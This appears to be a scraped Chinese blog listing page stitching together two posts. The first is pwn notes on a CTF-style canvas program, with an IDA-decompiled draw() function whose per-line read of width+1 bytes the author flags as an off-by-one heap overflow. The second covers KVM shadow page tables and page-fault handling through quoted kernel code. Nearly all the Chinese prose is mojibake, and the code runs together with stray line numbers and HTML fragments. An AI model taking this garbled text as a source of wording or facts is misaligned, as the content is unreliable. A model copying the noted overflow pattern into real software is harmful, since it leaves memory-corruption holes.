åœ¨ IDA Pro ä¸­ï¼Œâ€_DWORDâ€ã€â€_QWORDâ€ã€â€_BYTEâ€ ç­‰æ ‡è¯†ç¬¦é€šå¸¸è¡¨ç¤ºä¸åŒçš„æ•°æ®ç±»å‹æˆ–æ•°æ®å¤§å°ï¼Œç”¨äºå¸®åŠ©åˆ†æå’Œæ ‡è¯†åæ±‡ç¼–ä»£ç ä¸­çš„æ•°æ®ã€‚è¿™äº›æ ‡è¯†ç¬¦é€šå¸¸ä¸æ•°æ®ç±»å‹çš„å¤§å°æœ‰å…³ï¼Œä»¥ä¸‹æ˜¯å®ƒä»¬çš„ä¸€èˆ¬å«ä¹‰ï¼š

â€œ_DWORDâ€ï¼šä»£è¡¨ä¸€ä¸ª32ä½çš„åŒå­—ï¼ˆDouble Wordï¼‰ï¼Œé€šå¸¸å¯¹åº”äºä¸€ä¸ª32ä½æ•´æ•°ã€‚åœ¨æ±‡ç¼–å’Œåæ±‡ç¼–ä¸­ï¼ŒåŒå­—é€šå¸¸ç”±4ä¸ªå­—èŠ‚ç»„æˆã€‚
â€œ_QWORDâ€ï¼šä»£è¡¨ä¸€ä¸ª64ä½çš„å››å­—ï¼ˆQuad Wordï¼‰ï¼Œé€šå¸¸å¯¹åº”äºä¸€ä¸ª64ä½æ•´æ•°ã€‚åœ¨æ±‡ç¼–å’Œåæ±‡ç¼–ä¸­ï¼Œå››å­—é€šå¸¸ç”±8ä¸ªå­—èŠ‚ç»„æˆã€‚
â€œ_BYTEâ€ï¼šä»£è¡¨ä¸€ä¸ª8ä½çš„å­—èŠ‚ï¼ˆByteï¼‰ï¼Œé€šå¸¸å¯¹åº”äºä¸€ä¸ªå­—èŠ‚ã€‚åœ¨æ±‡ç¼–å’Œåæ±‡ç¼–ä¸­ï¼Œå­—èŠ‚é€šå¸¸ç”±ä¸€ä¸ªå­—èŠ‚ç»„æˆï¼Œç”¨äºè¡¨ç¤ºè¾ƒå°çš„æ•°æ®ã€‚
å­—æ˜¯16ä½(å†å²åŸå› ã€å…¼å®¹åŸå› â€¦â€¦â€¦.)

ç”»å †å—
123456789101112131415161718192021222324+---------+----------+--------------------+|                    |                    ||                    |    chunk head      ||                    |                    |+---------+----------+-----------------+--++---------+----------+--------------------+|                    |                    ||          v3   v2   | v0+8 malloc canvas ||                    |                    |+---------+----------+-----------------+--+ +---------+----------+--------------------+|                    |                    ||                    |                 ||                    |                    |+---------+----------+-----------------+--+                     ç”»å¸ƒ            





1234567891011121314151617181920212223242526int draw()&#123;  int result; // eax  int i; // [rsp+8h] [rbp-8h]  int idx; // [rsp+Ch] [rbp-4h]  idx = read_idx();  if ( !canvas[idx] )    return puts(&quot;Invalid index&quot;);  puts(&quot;Enter your picture (`width` chars in `height` lines): &quot;);  for ( i = 0; ; ++i )  &#123;    result = *(unsigned __int8 *)(canvas[idx] + 1LL); //height    if ( i &gt;= result )      break;    read( //ç”»ä¸€è¡Œ width      0,      (void *)(*(_QWORD *)(canvas[idx] + 8LL) + i * *(unsigned __int8 *)canvas[idx]),      *(unsigned __int8 *)canvas[idx] + 1);  &#125;// *(_QWORD *)(canvas[idx] + 8LL) æ˜¯ç”»å¸ƒçš„åœ°å€,    //i * *(unsigned __int8 *)canvas[idx] æ˜¯i * å®½    //*(unsigned __int8 *)canvas[idx] + 1 æ˜¯å…ˆå–äº†å®½,ç„¶å+1,    // æ‰€ä»¥è¾“å…¥0 8 1 çš„è¯,å°±æ˜¯è¯»å…¥ä¸€è¡Œ,è¯»å…¥9ä¸ªå­—ç¬¦(åŒ…æ‹¬ç»“æŸç¬¦å·)    // è¯»å…¥åœ°å€å°±æ˜¯å¼€å¤´å‘€  return result;&#125;



0 8 1
ç»“æŸç¬¦å·EOFåŒ…æ‹¬\n \0?
å‡½æ•°åï¼šread
å¤´æ–‡ä»¶ï¼š&lt;io.h&gt;
å‡½æ•°åŸå‹ï¼š int read(int handle,void *buf,int len);
åŠŸèƒ½ï¼šç”¨äºè¯»å–æ‰“å¼€æ–‡ä»¶çš„å†…å®¹
å‚æ•°ï¼šint handle ä¸ºè¦è¯»å–çš„æ–‡ä»¶
â€‹     void *buf ä¸ºè¦å°†è¯»å–çš„å†…å®¹ä¿å­˜çš„ç¼“å†²åŒº
â€‹     int len  è¯»å–æ–‡ä»¶çš„é•¿åº¦
è¿”å›å€¼ï¼šè¿”å›å®é™…è¯»å–çš„å­—èŠ‚æ•°
12345678910111213#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void main()&#123;    char *canvas[5];    char *str;    int addr;    canvas[0] = malloc(0x20);    addr = canvas[0];    addr = 1;    &#125;



æŒ‡é’ˆå’Œlong intå­˜å‚¨çš„æœ‰åŒºåˆ«å—? æœ‰åŒºåˆ«çš„,
å¦‚æœæ˜¯long intçš„è¯
*(uintptr_t *)(x+8) &#x3D; malloc(0x30); å…ˆæŠŠåœ°å€+8,ç„¶åå¼ºåˆ¶ç±»å‹è½¬æ¢æˆæŒ‡é’ˆ,ç„¶åè§£å¼•ç”¨
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%85%A5%E9%97%A8-3-%E5%86%85%E5%AD%98%E8%99%9A%E6%8B%9F%E5%8C%96%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/" title="è™šæ‹ŸåŒ–å…¥é—¨-3-å†…å­˜è™šæ‹ŸåŒ–ä»£ç åˆ†æ">è™šæ‹ŸåŒ–å…¥é—¨-3-å†…å­˜è™šæ‹ŸåŒ–ä»£ç åˆ†æ</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2023-09-19T10:19:06.000Z" title="å‘è¡¨äº 2023-09-19 18:19:06">2023-09-19</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2023-09-28T15:47:53.397Z" title="æ›´æ–°äº 2023-09-28 23:47:53">2023-09-28</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E8%99%9A%E6%8B%9F%E5%8C%96/">è™šæ‹ŸåŒ–</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/KVM/">KVM</a></span></div><div class="content">ä¸€ã€ä¿æŠ¤æ¨¡å¼Guestçš„å¯»å€åŸç†â€‹		ä¸ºæ¯ä¸ªguestè¿›ç¨‹åˆ†åˆ«åˆ¶ä½œä¸€å¼ è¡¨ï¼Œè®°å½•ç€GVAåˆ°HPAçš„æ˜ å°„å…³ç³»ã€‚guestæ¨¡å¼ä¸‹çš„cr3å¯„å­˜å™¨ä¸å†æŒ‡å‘å†…éƒ¨GVAåˆ°GPAæ˜ å°„çš„è¡¨ï¼Œè€Œæ˜¯æŒ‡å‘è¿™å¼ æ–°çš„è¡¨ã€‚å½“MMUæ”¶åˆ°GVAæ—¶ï¼Œé€šè¿‡éå†è¿™å¼ æ–°çš„è¡¨ï¼Œå°†GVAç¿»è¯‘æˆHPAã€‚
â€‹			å› ä¸ºguestè‡ªèº«é¡µè¡¨ä¸èƒ½å®ŒæˆGVAåˆ°HPAçš„å¤šå±‚åœ°å€æ˜ å°„ï¼Œå› æ­¤æ¯å½“guestè®¾ç½®cr3å¯„å­˜å™¨æ—¶ï¼ŒKVMéƒ½éœ€è¦æˆªè·è¿™ä¸ªæ“ä½œï¼Œå°†cr3æ›¿æ¢ä¸ºå½±å­é¡µè¡¨ï¼Œå› æ­¤æ¯æ¬¡è®¾ç½®cr3æ—¶éƒ½éœ€è¦è§¦å‘è™šæ‹Ÿæœºé€€å‡ºï¼Œé™·å…¥KVMæ¨¡å—ã€‚ï¼ˆæ— ç–‘ä¼šé€ æˆå¾ˆå¤§çš„èµ„æºæ¶ˆè€—ï¼Œæœ‰EPTä¹‹åå°±ä¸ç”¨äº†ï¼‰
â€‹		ä¸¤ä¸ªå…³é”®ç‚¹ï¼š

KVMéœ€è¦æ„å»ºGVAæ˜ å°„åˆ°HPAçš„é¡µè¡¨ï¼Œè¿™ä¸ªé¡µè¡¨éœ€è¦æ ¹æ®guestå†…éƒ¨é¡µè¡¨çš„ä¿¡æ¯æ›´æ–°ï¼Œå®é™…åœ°å€æ˜ å°„æ—¶ç”Ÿæ•ˆçš„æ˜¯è¿™å¼ é¡µè¡¨ï¼Œä¼šå°†guestå†…éƒ¨çš„é¡µè¡¨ç»™éšè—èµ·æ¥ï¼Œæ‰€ä»¥å®ƒå«å½±å­é¡µè¡¨
ä¿æŠ¤æ¨¡å¼çš„guestæœ‰è‡ªå·±çš„é¡µè¡¨ï¼Œè€Œä¸”ä¸åªæœ‰ä¸€ä¸ªé¡µè¡¨ï¼Œæ¯ä¸ªä»»åŠ¡éƒ½ä¼šæœ‰è‡ªå·±çš„é¡µè¡¨ï¼Œéšç€ä»»åŠ¡çš„åˆ‡æ¢è€Œæ›´æ¢é¡µè¡¨ï¼Œæ‰€ä»¥ï¼ŒKVMä¹Ÿéœ€è¦å‡†å¤‡å¤šä¸ªå½±å­é¡µè¡¨ï¼Œæ¯ä¸ªguestä»»åŠ¡å¯¹åº”ä¸€ä¸ªã€‚ å¹¶ä¸”åœ¨guestå†…éƒ¨ä»»åŠ¡åˆ‡æ¢æ—¶ï¼Œkvméœ€è¦æ•è·è¿™ä¸ªåˆ‡æ¢ï¼Œåˆ‡æ¢å¯¹åº”çš„å½±å­é¡µè¡¨ã€‚

â€‹		å»ºç«‹æ˜ å°„æ—¶ï¼Œéœ€è¦ç»è¿‡ä¸‰æ¬¡è½¬æ¢ï¼š

ç¬¬ä¸€æ¬¡æ˜¯guestä½¿ç”¨è‡ªèº«çš„é¡µè¡¨å®ŒæˆGVAåˆ°GPAçš„è½¬æ¢
ç¬¬äºŒæ¬¡æ˜¯KVMæ ¹æ®å†…å­˜æ¡ä¿¡æ¯å®ŒæˆGPAåˆ°HVAçš„è½¬æ¢
ç¬¬ä¸‰æ¬¡æ˜¯hoståˆ©ç”¨å†…æ ¸çš„å†…å­˜ç®¡ç†æœºåˆ¶å®ŒæˆHVAåˆ°HPAçš„è½¬æ¢

â€‹		å½±å­é¡µè¡¨æ„å»ºå¥½åï¼Œåœ¨æ˜ å°„å»ºç«‹å®Œæˆåï¼ŒGVAåˆ°HPAç»è¿‡ä¸€æ¬¡æ˜ å°„å³å¯ã€‚


å½±å­é¡µè¡¨çš„å»ºç«‹ &#x2F; ç¼ºé¡µå¼‚å¸¸å¤„ç†â€‹		ä¿æŠ¤æ¨¡å¼guestå‘ç”Ÿç¼ºé¡µå¼‚å¸¸æ—¶ï¼Œæ§åˆ¶cr2å¯„å­˜å™¨ä¸­å­˜å‚¨çš„æ˜¯GVAï¼Œè€Œåªæœ‰guestçŸ¥é“GVAåˆ°GPAçš„æ˜ å°„ï¼Œæ‰€ä»¥ï¼Œç¼ºé¡µå¼‚å¸¸å¤„ç†å‡½æ•°é¦–å…ˆéœ€è¦éå†guestçš„é¡µè¡¨ï¼Œå–å‡ºå¯¹åº”çš„GPAã€‚
â€‹		å¦‚æœæ²¡æœ‰å»ºç«‹GVAåˆ°GPAçš„æ˜ å°„ï¼Œåˆ™KVMå‘guestæ³¨å…¥ç¼ºé¡µå¼‚å¸¸ï¼Œguestè¿›è¡Œæ­£å¸¸çš„ç¼ºé¡µå¼‚å¸¸å¤„ç†ï¼Œå®ŒæˆGVAåˆ°GPAçš„æ˜ å°„ã€‚å»ºç«‹å¥½GVAåˆ°GPAçš„æ˜ å°„åï¼Œç„¶åå†ç»§ç»­å»ºç«‹GVAåˆ°HPAçš„æ˜ å°„ã€‚
â€‹		åˆšå¼€å§‹æ—¶ï¼Œå½±å­é¡µè¡¨æ˜¯ç©ºçš„ï¼Œæ‰€ä»¥å¼€å§‹æ—¶ä»»ä½•å†…å­˜è®¿é—®æ“ä½œéƒ½ä¼šå¼•èµ·ç¼ºé¡µå¼‚å¸¸ï¼Œå¯¼è‡´vm exit è¿›å…¥handle_exception_nmi (ä¸å¯å±è”½ä¸­æ–­å¼‚å¸¸å¤„ç†)
â€‹		handle_exception_nmiä»è¿™é‡Œè¿›å…¥å¼‚å¸¸å¤„ç†
12345678910111213141516171819static int handle_exception_nmi(struct kvm_vcpu *vcpu)&#123;	struct vcpu_vmx *vmx = to_vmx(vcpu);	struct kvm_run *kvm_run = vcpu-&gt;run;......	if (is_page_fault(intr_info)) &#123;		cr2 = vmx_get_exit_qual(vcpu);		if (enable_ept &amp;&amp; !vcpu-&gt;arch.apf.host_apf_flags) &#123;			/*			 * EPT will cause page fault only if we need to			 * detect illegal GPAs.			 */			WARN_ON_ONCE(!allow_smaller_maxphyaddr);			kvm_fixup_and_inject_pf_error(vcpu, cr2, error_code);			return 1;		&#125; else			return kvm_handle_page_fault(vcpu, error_code, cr2, NULL, 0);	&#125;

â€‹		è°ƒç”¨é“¾å¦‚ä¸‹
1234- kvm_handle_page_fault    - kvm_mmu_page_fault    	- kvm_mmu_do_page_fault    		- 

â€‹		åˆ°äº†è¿™é‡Œä¹‹å, å¦‚æœæ²¡å¼€å¯eptï¼Œä¼šè¿›å…¥elseï¼ŒçŒœæµ‹è¿™é‡Œçš„page_faultæ˜¯FNAME(page_fault)ï¼Œè¿™æ ·å°±è¿èµ·æ¥äº†
12345678static inline int kvm_mmu_do_page_fault(struct kvm_vcpu *vcpu, gpa_t cr2_or_gpa,					u32 err, bool prefetch, int *emulation_type)&#123;    .....    if (IS_ENABLED(CONFIG_RETPOLINE) &amp;&amp; fault.is_tdp)		r = kvm_tdp_page_fault(vcpu, &amp;fault);	else		r = vcpu-&gt;arch.mmu-&gt;page_fault(vcpu, &amp;fault);

GVA-GPA æ˜ å°„kvm\mmu\paging_tmpl.h
123456789101112131415161718192021222324252627282930313233343536373839404142434445static int FNAME(page_fault)(struct kvm_vcpu *vcpu, struct kvm_page_fault *fault)&#123;	struct guest_walker walker;	int r;	pgprintk(&quot;%s: addr %lx err %x\n&quot;, __func__, fault-&gt;addr, fault-&gt;error_code);	WARN_ON_ONCE(fault-&gt;is_tdp);	/*	 * Look up the guest pte for the faulting address.	 * If PFEC.RSVD is set, this is a shadow page fault.	 * The bit needs to be cleared before walking guest page tables.	 */	r = FNAME(walk_addr)(&amp;walker, vcpu, fault-&gt;addr,			     fault-&gt;error_code &amp; ~PFERR_RSVD_MASK);	/*	 * The page is not mapped by the guest.  Let the guest handle it.	 */	if (!r) &#123;		pgprintk(&quot;%s: guest page fault\n&quot;, __func__);		if (!fault-&gt;prefetch)			kvm_inject_emulated_page_fault(vcpu, &amp;walker.fault);		return RET_PF_RETRY;	&#125;	fault-&gt;gfn = walker.gfn;	fault-&gt;max_level = walker.level;	fault-&gt;slot = kvm_vcpu_gfn_to_memslot(vcpu, fault-&gt;gfn);//è·å–å†…å­˜æ¡ä¿¡æ¯	if (page_fault_handle_page_track(vcpu, fault)) &#123;		shadow_page_table_clear_flood(vcpu, fault-&gt;addr);		return RET_PF_EMULATE;	&#125;	r = mmu_topup_memory_caches(vcpu, true);	if (r)		return r;	r = kvm_faultin_pfn(vcpu, fault, walker.pte_access);//å…³é”®å‡½æ•°	if (r != RET_PF_CONTINUE)		return r;....&#125;

â€‹		åœ¨ç¡¬ä»¶MMUä¸­ï¼ŒTable walkå•å…ƒè´Ÿè´£éå†é¡µè¡¨ï¼Œè¿™é‡Œå‡½æ•°walk_addrå°±ç›¸å½“äºç¡¬ä»¶MMuä¸­Table walkï¼Œè´Ÿè´£éå†guesté¡µè¡¨ã€‚ å¼‚å¸¸å¤„ç†å‡½æ•°é¦–å…ˆè°ƒç”¨è¿™ä¸ªå‡½æ•°éå†guessé¡µè¡¨ï¼Œå°è¯•å–å‡ºGPAï¼Œè§14è¡Œä»£ç ï¼Œéå†å®Œåï¼ŒæŠŠå…·ä½“ä¿¡æ¯ä¿å­˜åœ¨walkerä¸­ã€‚
â€‹		æ„Ÿè§‰å†™çš„æ³¨é‡Šéå¸¸ç²¾é«“
123456/* * Fetch a guest pte for a guest virtual address, or for an L2&#x27;s GPA. */static int FNAME(walk_addr_generic)(struct guest_walker *walker,				    struct kvm_vcpu *vcpu, struct kvm_mmu *mmu,				    gpa_t addr, u64 access)



â€‹		å¦‚æœè¿”å›0ï¼Œè¯´æ˜æ²¡æœ‰å»ºç«‹æ˜ å°„ï¼Œè¿›è¡Œguestçš„ç¼ºé¡µå¤„ç†ï¼Œæ³¨å…¥å¼‚å¸¸ï¼Œguestå»å»ºç«‹GVAåˆ°GPAçš„æ˜ å°„ã€‚è§20è¡Œã€‚
â€‹		è¿›å…¥åˆ°kvm_inject_emulated_page_fault
x86.c
123456789101112131415161718192021void kvm_inject_emulated_page_fault(struct kvm_vcpu *vcpu,				    struct x86_exception *fault)&#123;	struct kvm_mmu *fault_mmu;	WARN_ON_ONCE(fault-&gt;vector != PF_VECTOR);	fault_mmu = fault-&gt;nested_page_fault ? vcpu-&gt;arch.mmu :					       vcpu-&gt;arch.walk_mmu;	/*	 * Invalidate the TLB entry for the faulting address, if it exists,	 * else the access will fault indefinitely (and to emulate hardware).	 */	if ((fault-&gt;error_code &amp; PFERR_PRESENT_MASK) &amp;&amp;	    !(fault-&gt;error_code &amp; PFERR_RSVD_MASK))		kvm_mmu_invalidate_addr(vcpu, fault_mmu, fault-&gt;address,					KVM_MMU_ROOT_CURRENT);	fault_mmu-&gt;inject_page_fault(vcpu, fault);&#125;EXPORT_SYMBOL_GPL(kvm_inject_emulated_page_fault);

â€‹		ä¼šè°ƒç”¨ inject_page_fault, å¯¹åº”çš„å‡½æ•°å¦‚ä¸‹
12345678910111213141516void kvm_inject_page_fault(struct kvm_vcpu *vcpu, struct x86_exception *fault)&#123;	++vcpu-&gt;stat.pf_guest;	/*	 * Async #PF in L2 is always forwarded to L1 as a VM-Exit regardless of	 * whether or not L1 wants to intercept &quot;regular&quot; #PF.	 */	if (is_guest_mode(vcpu) &amp;&amp; fault-&gt;async_page_fault)		kvm_queue_exception_vmexit(vcpu, PF_VECTOR,					   true, fault-&gt;error_code,					   true, fault-&gt;address);	else		kvm_queue_exception_e_p(vcpu, PF_VECTOR, fault-&gt;error_code,					fault-&gt;address);&#125;

GPA-HPA æ˜ å°„â€‹		å»ºç«‹æ˜ å°„åå¾€åèµ°ï¼Œæ¥åˆ°ä¸‹ä¸€ä¸ªé‡è¦å‡½æ•°
â€‹		kvm_faultin_pfnè¿™ä¸ªå‡½æ•°ç”¨æ¥å¤„ç†è™šæ‹Ÿåœ°å€æ˜ å°„åˆ°å®¿ä¸»æœºçš„ç‰©ç†åœ°å€
mmu.c
123456789101112131415161718192021static int kvm_faultin_pfn(struct kvm_vcpu *vcpu, struct kvm_page_fault *fault,			   unsigned int access)&#123;	int ret;	fault-&gt;mmu_seq = vcpu-&gt;kvm-&gt;mmu_invalidate_seq;	smp_rmb();	ret = __kvm_faultin_pfn(vcpu, fault);	if (ret != RET_PF_CONTINUE)		return ret;	if (unlikely(is_error_pfn(fault-&gt;pfn)))		return kvm_handle_error_pfn(vcpu, fault);	if (unlikely(!fault-&gt;slot))		return kvm_handle_noslot_fault(vcpu, fault, access);	return RET_PF_CONTINUE;&#125;

â€‹		è¿™å…¶ä¸­ä¸»è¦è°ƒç”¨__kvm_faultin_pfnå®Œæˆå®é™…æ˜ å°„å·¥ä½œ
123456789101112static int __kvm_faultin_pfn(struct kvm_vcpu *vcpu, struct kvm_page_fault *fault)&#123;	struct kvm_memory_slot *slot = fault-&gt;slot;	bool async;.....	async = false;	fault-&gt;pfn = __gfn_to_pfn_memslot(slot, fault-&gt;gfn, false, false, &amp;async,					  fault-&gt;write, &amp;fault-&gt;map_writable,					  &amp;fault-&gt;hva);......&#125;

â€‹		è€Œè¿™é‡Œï¼Œæœ€å…³é”®çš„æ˜¯__gfn_to_pfn_memslotï¼Œé€šè¿‡è¿™ä¸ªå‡½æ•°æ‹¿åˆ°pfn
å½±å­é¡µè¡¨å¡«å……â€‹		æ˜ å°„å’Œå¡«å……æ˜¯ä¸¤å›äº‹? 
for_each_shadow_entryç”¨æ¥è¿­ä»£ä¸åŒé¡µè¡¨çº§åˆ«
123456789101112131415161718192021222324252627282930313233343536static int FNAME(fetch)(struct kvm_vcpu *vcpu, struct kvm_page_fault *fault,			 struct guest_walker *gw)&#123;    .....    	for_each_shadow_entry(vcpu, fault-&gt;addr, it) &#123; //åº”è¯¥æ˜¯ç”¨æ¥æŸ¥æ‰¾å¯¹åº”çº§åˆ«çš„é¡µè¡¨ç›®å½•		gfn_t table_gfn;		clear_sp_write_flooding_count(it.sptep);		if (it.level == gw-&gt;level)			break;		table_gfn = gw-&gt;table_gfn[it.level - 2]; //è·å–å½“å‰é¡µè¡¨çº§åˆ«çš„è¡¨é¡¹å¯¹åº”çš„é¡µè¡¨é¡µçš„GFN		access = gw-&gt;pt_access[it.level - 2];		sp = kvm_mmu_get_child_sp(vcpu, it.sptep, table_gfn,					  false, access); //å°è¯•è·å–æˆ–åˆ›å»ºå½“å‰é¡µè¡¨çº§åˆ«çš„å½±å­é¡µè¡¨é¡µï¼Œfalseè¡¨ç¤ºä¸åˆ›å»ºæ–°çš„ï¼Œä»…å°è¯•è·å–å·²å­˜åœ¨çš„//it.sptep è¡¨ç¤ºå½“å‰çš„SPTE		if (sp != ERR_PTR(-EEXIST)) &#123; // æˆåŠŸè·å–æˆ–åˆ›å»º		.............		/*		 * Verify that the gpte in the page we&#x27;ve just write		 * protected is still there.		 */		if (FNAME(gpte_changed)(vcpu, gw, it.level - 1))			goto out_gpte_changed;		if (sp != ERR_PTR(-EEXIST))			link_shadow_page(vcpu, it.sptep, sp);//å°†å½±å­é¡µè¡¨ä¸SPTEè¿›è¡Œé“¾æ¥		if (fault-&gt;write &amp;&amp; table_gfn == fault-&gt;gfn)			fault-&gt;write_fault_to_shadow_pgtable = true;                       .....        ret = mmu_set_spte(vcpu, fault-&gt;slot, it.sptep, gw-&gt;pte_access,			   base_gfn, fault-&gt;pfn, fault); //è®¾ç½®/æ›´æ–°PTE          .....	&#125;

â€‹		kvm_mmu_get_child_sp
12345678910111213static struct kvm_mmu_page *kvm_mmu_get_child_sp(struct kvm_vcpu *vcpu,						 u64 *sptep, gfn_t gfn,						 bool direct, unsigned int access)&#123;	union kvm_mmu_page_role role;	if (is_shadow_present_pte(*sptep) &amp;&amp; !is_large_pte(*sptep))		return ERR_PTR(-EEXIST); // æ£€æŸ¥æ˜¯å¦å­˜åœ¨	role = kvm_mmu_child_role(sptep, direct, access); //æ–°çš„é¡µè¡¨çš„å±æ€§	return kvm_mmu_get_shadow_page(vcpu, gfn, role);//æŸ¥æ‰¾/åˆ›å»ºæ–°çš„å½±å­é¡µè¡¨é¡µ&#125;

â€‹		kvm_mmu_get_shadow_pageæ¥åˆ›å»º&#x2F;æŸ¥æ‰¾
123456789101112static struct kvm_mmu_page *kvm_mmu_get_shadow_page(struct kvm_vcpu *vcpu,						    gfn_t gfn,						    union kvm_mmu_page_role role)&#123;	struct shadow_page_caches caches = &#123;		.page_header_cache = &amp;vcpu-&gt;arch.mmu_page_header_cache,		.shadow_page_cache = &amp;vcpu-&gt;arch.mmu_shadow_page_cache,		.shadowed_info_cache = &amp;vcpu-&gt;arch.mmu_shadowed_info_cache,	&#125;;	return __kvm_mmu_get_shadow_page(vcpu-&gt;kvm, vcpu, &amp;caches, gfn, role);//gfnè¡¨ç¤ºéœ€è¦æ˜ å°„çš„guesté¡µçš„åœ°å€&#125;

â€‹		__kvm_mmu_get_shadow_page æœ€ç»ˆçš„æŸ¥æ‰¾&#x2F;åˆ›å»ºå½±å­é¡µè¡¨é¡µ
12345678910111213141516171819202122/* Note, @vcpu may be NULL if @role.direct is true; see kvm_mmu_find_shadow_page. */static struct kvm_mmu_page *__kvm_mmu_get_shadow_page(struct kvm *kvm,						      struct kvm_vcpu *vcpu,						      struct shadow_page_caches *caches,						      gfn_t gfn,						      union kvm_mmu_page_role role)&#123;	struct hlist_head *sp_list;	struct kvm_mmu_page *sp;	bool created = false;	sp_list = &amp;kvm-&gt;arch.mmu_page_hash[kvm_page_table_hashfn(gfn)];	sp = kvm_mmu_find_shadow_page(kvm, vcpu, gfn, sp_list, role);//ä»å“ˆå¸Œè¡¨ä¸­æŸ¥æ‰¾æŒ‡å®šgfnå’Œroleçš„å½±å­é¡µè¡¨é¡µ	if (!sp) &#123; // æ²¡æœ‰æ‰¾åˆ°ï¼Œè¿›è¡Œåˆ›å»º		created = true;		sp = kvm_mmu_alloc_shadow_page(kvm, caches, gfn, sp_list, role);	&#125;	trace_kvm_mmu_get_page(sp, created);	return sp;&#125;



â€‹		éå†åˆ°æœ€åä¸€çº§é¡µè¡¨ï¼Œç›¸åº”çš„è¡¨é¡¹ä¸å­˜åœ¨ï¼Œå°±éœ€è¦ä½GPAç”³è¯·ç‰©ç†é¡µé¢ã€å¡«å……é¡µè¡¨é¡¹äº†
set_pteå¯»æ‰¾ç©ºé—²çš„ç‰©ç†é¡µï¼Œå¡«å……é¡µè¡¨é¡¹
123456789101112131415161718static int mmu_set_spte(struct kvm_vcpu *vcpu, struct kvm_memory_slot *slot,			u64 *sptep, unsigned int pte_access, gfn_t gfn,			kvm_pfn_t pfn, struct kvm_page_fault *fault)&#123;	struct kvm_mmu_page *sp = sptep_to_sp(sptep);	int level = sp-&gt;role.level;    ........       	if (is_shadow_present_pte(*sptep)) 	......	wrprot = make_spte(vcpu, sp, slot, pte_access, gfn, pfn, *sptep, prefetch,			   true, host_writable, &amp;spte);...&#125;

â€‹		make_spte ç”Ÿæˆæ–°çš„é¡µè¡¨é¡¹
å»ºç«‹å¥½ä¹‹åçš„å¯»å€â€‹		æ¯æ¬¡è®¿é—®cr3éƒ½ä¼šè§¦å‘å¼‚å¸¸
12345678910111213141516171819202122232425static int handle_cr(struct kvm_vcpu *vcpu)&#123;	unsigned long exit_qualification, val;	int cr;	int reg;	int err;	int ret;	exit_qualification = vmx_get_exit_qual(vcpu);  //è¯»å–å­—æ®µ	cr = exit_qualification &amp; 15; //æå–å­—æ®µçš„ 0-3ä½ï¼Œåˆ¤æ–­è®¿é—®çš„é‚£ä¸ªæ§åˆ¶å¯„å­˜å™¨	reg = (exit_qualification &gt;&gt; 8) &amp; 15;//æå–8-11ä½ï¼Œåˆ¤æ–­guestè¯•å›¾åŠ è½½åˆ°cr3çš„é¡µè¡¨åœ°å€å­˜å‚¨åœ¨å“ªä¸ªå¯„å­˜å™¨	switch ((exit_qualification &gt;&gt; 4) &amp; 3) &#123;//æå–4ã€5ä½ åˆ¤æ–­æ—¶å†™è¿˜æ˜¯è¯»æ§åˆ¶å¯„å­˜å™¨ 0è¡¨ç¤ºå†™	case 0: /* mov to cr */		val = kvm_register_read(vcpu, reg);		trace_kvm_cr_write(cr, val);		switch (cr) &#123;		case 0:			err = handle_set_cr0(vcpu, val);			return kvm_complete_insn_gp(vcpu, err);		case 3:			WARN_ON_ONCE(enable_unrestricted_guest);			err = kvm_set_cr3(vcpu, val);			return kvm_complete_insn_gp(vcpu, err);..........

â€‹		ä¸çŸ¥é“kvm_register_readè¯»å–çš„cr3æ˜¯å¦å­˜å‚¨ç€å½±å­é¡µè¡¨çš„åœ°å€ï¼Œæ˜¯çš„è¯é€»è¾‘å°±æ¯”è¾ƒç®€å•äº†ï¼Œè®¾ç½®cr3ä¸ºå½±å­é¡µè¡¨çš„åœ°å€ï¼Œç„¶åå°±æ‹¿åˆ°äº†åœ°å€æ˜ å°„ï¼Œè¿›è¡Œåç»­å†…å­˜æ“ä½œï¼Ÿï¼Ÿ
1234int kvm_set_cr3(struct kvm_vcpu *vcpu, unsigned long cr3)&#123;.....	vcpu-&gt;arch.cr3 = cr3;

â€‹		
äºŒã€EPTâ€‹		ç®€è€Œè¨€ä¹‹ï¼šMMUå®ŒæˆGVAåˆ°GPAçš„æ˜ å°„ï¼ˆkvmä¸æ•è·å¼‚å¸¸äº†ï¼Œguestè‡ªå·±å¤„ç†ï¼‰ï¼ŒEPTå®ŒæˆGPAåˆ°HPAçš„æ˜ å°„. å¼•å…¥äº†EPT violationå¼‚å¸¸å¤„ç†EPTçš„ç¼ºé¡µ
